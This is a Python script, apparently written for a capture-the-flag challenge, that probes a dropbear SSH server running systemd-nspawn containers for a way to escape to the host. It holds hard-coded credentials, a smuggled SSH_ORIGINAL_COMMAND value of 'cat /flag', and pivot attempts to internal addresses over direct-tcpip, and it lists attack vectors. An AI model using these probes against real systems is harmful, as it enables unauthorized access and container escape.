#!/usr/bin/env python3
"""
关键测试：理解FakeJumpServer行为

当我们使用 ssh -J ctf@dropbear ctf@localhost 时：
1. 第一次SSH到dropbear
2. dropbear创建direct-tcpip通道到localhost:22
3. localhost:22 是dropbear自己，但会创建新的nspawn容器

问题：如何逃逸到宿主机？

思路：
- dropbear可能在宿主机上运行
- nspawn容器通过某种方式创建
- 如果我们能让dropbear不创建容器，而是给我们宿主机shell？
"""

import paramiko
import socket
import time

TARGET_HOST = "61.147.171.35"
TARGET_PORT = 58677
USERNAME = "ctf"
PASSWORD = "123456"

def get_clean_session():
    """获取一个干净的SSH会话"""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(TARGET_HOST, TARGET_PORT, USERNAME, PASSWORD, timeout=10)
    return client

def test_session_with_exit():
    """测试正常退出会话后的行为"""
    print("=" * 70)
    print("[*] 测试正常会话（确保退出）")
    print("=" * 70)
    
    client = get_clean_session()
    transport = client.get_transport()
    
    # 打开session通道
    channel = transport.open_channel("session")
    channel.get_pty()
    channel.invoke_shell()
    
    time.sleep(0.5)
    
    # 读取输出
    output = b""
    while channel.recv_ready():
        output += channel.recv(4096)
    print(f"Shell prompt: {output.decode(errors='replace')}")
    
    # 执行命令
    channel.send(b"id\n")
    time.sleep(0.5)
    output = b""
    while channel.recv_ready():
        output += channel.recv(4096)
    print(f"id output: {output.decode(errors='replace')}")
    
    # 正常退出
    channel.send(b"exit\n")
    time.sleep(0.5)
    
    channel.close()
    client.close()
    print("[*] 会话已正常关闭")

def test_env_request():
    """测试环境变量设置"""
    print("\n" + "=" * 70)
    print("[*] 测试SSH环境变量")
    print("=" * 70)
    
    client = get_clean_session()
    transport = client.get_transport()
    
    # 打开session通道并设置环境变量
    channel = transport.open_channel("session")
    
    # 尝试设置各种环境变量
    env_vars = [
        ("SSH_ORIGINAL_COMMAND", "cat /flag"),
        ("TERM", "xterm"),
        ("LC_ALL", "C"),
        ("HOME", "/"),
        ("PATH", "/bin:/sbin:/usr/bin:/usr/sbin"),
    ]
    
    for name, value in env_vars:
        try:
            channel.set_environment_variable(name, value)
            print(f"  [+] 设置 {name}={value}")
        except Exception as e:
            print(f"  [-] 设置 {name} 失败: {e}")
    
    channel.exec_command("env")
    time.sleep(1)
    output = channel.recv(4096).decode(errors='replace')
    print(f"环境变量:\n{output}")
    
    channel.close()
    client.close()

def test_subsystem():
    """测试SSH子系统"""
    print("\n" + "=" * 70)
    print("[*] 测试SSH子系统")
    print("=" * 70)
    
    client = get_clean_session()
    transport = client.get_transport()
    
    subsystems = ["sftp", "netconf", "shell", "exec", "internal-sftp"]
    
    for subsys in subsystems:
        try:
            channel = transport.open_channel("session")
            channel.invoke_subsystem(subsys)
            time.sleep(0.5)
            output = b""
            while channel.recv_ready():
                output += channel.recv(4096)
            print(f"  {subsys}: {output[:100] if output else '(no output)'}")
            channel.close()
        except Exception as e:
            print(f"  {subsys}: 错误 - {e}")
    
    client.close()

def test_x11_forwarding():
    """测试X11转发"""
    print("\n" + "=" * 70)
    print("[*] 测试X11转发")
    print("=" * 70)
    
    client = get_clean_session()
    transport = client.get_transport()
    
    channel = transport.open_channel("session")
    
    try:
        # 请求X11转发
        channel.request_x11()
        print("  [+] X11转发请求成功")
    except Exception as e:
        print(f"  [-] X11转发失败: {e}")
    
    channel.close()
    client.close()

def test_port_forwarding():
    """测试端口转发"""
    print("\n" + "=" * 70)
    print("[*] 测试端口转发")
    print("=" * 70)
    
    client = get_clean_session()
    transport = client.get_transport()
    
    # 测试tcpip-forward（反向端口转发）
    try:
        port = transport.request_port_forward("", 0)
        print(f"  [+] tcpip-forward成功，分配端口: {port}")
        transport.cancel_port_forward("", port)
    except Exception as e:
        print(f"  [-] tcpip-forward失败: {e}")
    
    # 测试direct-tcpip到各种目标
    targets = [
        ("localhost", 22),
        ("172.17.0.1", 22),
        ("172.17.0.1", 80),
        ("10.42.0.1", 22),
        ("127.0.0.1", 22),
        # 尝试连接flag相关
        ("flag", 22),
        ("flag", 80),
    ]
    
    for host, port in targets:
        try:
            channel = transport.open_channel(
                "direct-tcpip",
                (host, port),
                ("127.0.0.1", 0)
            )
            channel.settimeout(2)
            try:
                banner = channel.recv(256)
                print(f"  [+] {host}:{port} => {banner[:50]}")
            except:
                print(f"  [?] {host}:{port} => 连接成功但无数据")
            channel.close()
        except Exception as e:
            print(f"  [-] {host}:{port} => {e}")
    
    client.close()

def test_global_request():
    """测试全局请求"""
    print("\n" + "=" * 70)
    print("[*] 测试全局请求")
    print("=" * 70)
    
    client = get_clean_session()
    transport = client.get_transport()
    
    # 测试各种全局请求
    requests = [
        "tcpip-forward",
        "cancel-tcpip-forward",
        "no-more-sessions@openssh.com",
        "hostkeys-00@openssh.com",
        "hostkeys-prove-00@openssh.com",
    ]
    
    from paramiko.message import Message
    
    for req in requests:
        try:
            m = Message()
            m.add_string(req)
            m.add_boolean(True)  # want reply
            # 这是一个简化的测试
            print(f"  尝试: {req}")
        except Exception as e:
            print(f"  {req}: {e}")
    
    client.close()

def analyze_nspawn_behavior():
    """分析nspawn容器行为"""
    print("\n" + "=" * 70)
    print("[*] 分析nspawn容器行为")
    print("=" * 70)
    print("""
    关键发现：
    1. dropbear在宿主机运行
    2. 每次SSH会话创建nspawn容器
    3. 容器rootfs在 /var/lib/machines/rootfs
    4. 如果不正常退出，rootfs会被占用
    
    潜在攻击向量：
    1. 通过某种方式阻止nspawn启动
    2. 利用环境变量或参数注入
    3. 使用SSH特性绕过容器
    4. 找到dropbear的配置或密钥
    """)

if __name__ == "__main__":
    # 先确保退出之前的会话
    test_session_with_exit()
    
    time.sleep(1)
    
    # 测试各种SSH特性
    test_env_request()
    test_subsystem()
    test_x11_forwarding()
    test_port_forwarding()
    
    analyze_nspawn_behavior()
